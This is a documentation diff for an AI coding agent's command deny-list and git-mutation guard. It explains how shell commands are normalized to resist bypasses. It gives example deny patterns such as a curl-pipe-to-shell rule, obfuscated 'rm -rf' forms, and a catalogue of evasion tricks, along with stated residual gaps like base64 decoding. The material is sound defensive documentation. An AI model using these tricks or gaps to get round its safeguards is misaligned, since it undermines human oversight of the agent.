@@ -365,7 +365,25 @@ Independent of any profile or auto-approve flag, `permissions.denyCommands` is a
 
 - Case-sensitive; whitespace is normalized on both sides.
 - **Substring match** (default): `"git push"` blocks `git push`, `git push origin main`, `sudo git push`, etc.
-- **Glob match** (contains `*`): the `*` matches any character sequence and the pattern must match the **entire** command. `"curl * | *sh"` blocks `curl evil.sh | bash` but not `sudo curl evil.sh | bash` — widen with `"*curl * | *sh*"` if needed.
+- **Glob match** (contains `*`): `*` matches any character sequence; the pattern must match the **entire** normalized command **or** one entire command segment (commands split on `;`, `|`, `&&`, `||` after normalization). `"curl * | *sh"` blocks `curl evil.sh | bash` — including `sudo curl evil.sh | bash`, since wrapper prefixes are folded before matching.
+
+### Normalization & bypass resistance
+
+Commands are normalized by `normalizeCommand()` before matching — the same pass the git-mutation guards below use. Normalization covers:
+
+- **Shell quoting**: `r\m`, `r''m`, `"rm"`, and ANSI-C `$'\xNN'` escapes decode to `rm`.
+- **`$IFS` / whitespace variants**: `rm$IFS-rf` reads as `rm -rf`.
+- **`env` / `VAR=x` prefixes**: `env FOO=1 rm -rf x` → `rm -rf x`.
+- **Wrapper commands**: `nice`, `time`, `xargs`, `sudo`, `doas`, `timeout`, `nohup`, `exec`, `command`, `builtin`, `strace`, `busybox`, `sh`/`bash`/`zsh`/`pwsh`/`cmd -c`, and `eval` are folded away — `bash -c "rm -rf x"` → `rm -rf x`.
+- **Path-prefixed binaries**: `/usr/bin/rm` and `C:\tools\git.exe` reduce to their basename.
+- **Variable indirection**: `a=rm; $a -rf x` resolves to `rm -rf x`; `${X:-def}` resolves to its default when unset.
+- **Substitution bodies**: `` ` ``/`$( )` inner text stays visible to matching — `$(echo rm) -rf x` still contains `rm -rf`.
+
+Commands that still contain dynamic constructs after normalization (`eval`, `$( )`/backticks, unresolved `$VAR` references, `xargs` stdin args) are treated as **opaque** and matched **fail-closed**: when the literal text still carries every word of a deny pattern, the command is denied.
+
+#### Residual limits
+
+String matching is not a shell interpreter: it cannot decode base64 or otherwise evaluate substitution output, and a `$VAR` whose value is not assigned inside the command string is unresolvable. For hard boundaries (filesystem scope, network egress allowlist, seccomp) combine `denyCommands` with the [tool-call sandbox](sandboxing.md) — deny always wins, and the sandbox constrains whatever string matching cannot see.
 
 When a command is denied, the agent receives an error naming the matched rule so it can choose a different approach — there is no interactive prompt for denied commands.
 
@@ -384,6 +402,8 @@ For orchestrators that own git state externally (ai-sdlc workers, Hermes), `perm
 Or per invocation: `scc chat -yq --no-commit 'implement issue #42'`.
 
 **Blocked:** `git` tool `add`/`commit` operations; `run_shell` invocations of `git add|commit|push|pull|checkout|switch|restore|reset|rebase|merge|cherry-pick|revert|stash|tag <args>|branch <args>|clone|init|fetch|clean|mv|rm|am|apply|submodule|worktree` (including inside `cd x && git …` chains).
+
+The matcher runs on normalized commands (same `normalizeCommand()` pass as `denyCommands`): `git --git-dir=… --work-tree=… reset`, `git -C dir commit`, `env VAR=x git …`, `sudo git …`, `/usr/bin/git …`, `g''it commit`, `eval "git …"`, `a=git; $a reset`, and `bash -c "git …"` are all detected. A `git` whose subcommand is an unresolvable expansion (`git $OP`, `xargs git`) is refused as `git <dynamic>` — see [Residual limits](#residual-limits) above for what string matching cannot prove.
 
 **Still allowed:** read-only git (`status`, `diff`, `log`, `show`, `git branch`/`git tag` with no extra args) and all non-git tools — the model stays in edit-only mode.
 
@@ -417,6 +437,8 @@ See [sandboxing.md](sandboxing.md) for the full profile schema and backend matri
 In unattended runs the dedicated `git` tool owns repo state: `run_shell` refuses **every** git-mutating command — `git checkout --`, `git restore`, `git reset --hard`, `git clean -f`, `git stash`, plus `add`/`commit`/`push`/`pull`/`rebase`/`merge`/`cherry-pick`/`revert`/`tag <args>`/`branch <args>`/`clone`/`init`/`fetch`/`mv`/`rm`/`am`/`apply`/`submodule`/`worktree`/`switch`/`checkout` (including inside `cd x && git …` chains). The refusal error is routed back to the model and steers it to the `git` tool for supported operations (`status`, `diff`, `log`, `show`, `branch`, `add`, `commit`, `format`).
 
 Why: an unattended model that runs `git checkout -- .`/`git restore`/`git reset --hard`/`git clean`/`git stash` can silently revert its own edits before the wrapper commits — the run reports success against a clean tree. Read-only git (`status`, `diff`, `log`, `show`, bare `branch`/`tag`) and all non-git commands stay allowed. Interactive mode is unaffected — the human approves each command.
+
+The guard shares `denyCommands`' normalization (#474): long global flags (`git --git-dir=… --work-tree=… reset`), `-C`/`env`/wrapper prefixes, path-prefixed binaries (`/usr/bin/git`), quoting (`g''it`), `eval`, and variable indirection (`a=git; $a reset`) cannot bypass it — an unresolvable `git $OP` fails closed as `git <dynamic>`.
 
 To block git mutations in **every** mode (orchestrators that own git state externally), use `denyGitMutation` / `--no-commit` above — it additionally disables the `git` tool's `add`/`commit`.
 
